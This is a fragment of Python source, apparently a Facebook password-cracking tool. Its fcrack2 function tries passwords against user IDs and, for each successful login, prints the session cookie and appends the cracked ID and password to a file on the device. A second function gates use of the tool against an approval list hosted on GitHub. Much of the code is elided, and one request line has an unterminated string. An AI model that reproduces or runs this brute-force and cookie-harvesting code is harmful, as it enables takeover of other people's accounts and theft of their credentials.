...
def fcrack2(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m  [NUR>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
               #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/NUR-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
               
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[NUR] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}NUR{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  id = "4h".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/nuryt70/approve.txt/blob/main/approve).text
    if id in httpCaht:
